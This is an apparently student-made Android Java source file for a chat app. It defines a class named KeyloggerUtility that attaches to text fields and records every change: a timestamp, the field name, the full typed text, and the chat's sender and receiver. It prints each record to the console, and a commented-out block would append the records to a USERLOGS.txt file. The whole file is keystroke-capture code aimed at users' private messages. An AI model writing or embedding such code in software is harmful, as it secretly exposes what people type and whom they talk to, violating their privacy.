package com.example.mychatapp;

import android.Manifest;
import android.content.pm.PackageManager;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.KeyEvent;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;

public class KeyloggerUtility implements TextWatcher {

    private String fieldName;
    private String chatReceiver;

    private String chatSender;
    private String date = "";

    private String logMessageLine = "";

    public KeyloggerUtility (String fieldName , String chatReceiver , String chatSender){
        this.fieldName = fieldName;
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        this.date = dateFormat.format(new Date());
        this.chatReceiver = chatReceiver;
        this.chatSender=chatSender;
    }

    @Override
    public void beforeTextChanged(CharSequence s, int start, int count, int after) {

    }

    @Override
    public void onTextChanged(CharSequence s, int start, int before, int count) {

    }

    @Override
    public void afterTextChanged(Editable s) {
        //Log.d(this.date+"|"+this.fieldName,s.toString());

        if (this.chatReceiver == "") {
            logMessageLine = this.date+" | "+this.fieldName+" | "+s.toString()+" | ";
            System.out.println(logMessageLine+'\n');


        }else{
            logMessageLine = this.date+" | "+this.fieldName+" | "+s.toString()+" | " + "SENDER{"+chatSender+"} RECEIVER{"+chatReceiver+"}";
            System.out.println(logMessageLine+'\n');

        }


        try {

            //FileOutputStream fos = new FileOutputStream("USERLOGS.txt",true);
            //fos.write(logMessageLine.getBytes(StandardCharsets.UTF_8));
            //fos.close();

        }catch (Exception e){
            //e.printStackTrace();
        }


    }
}
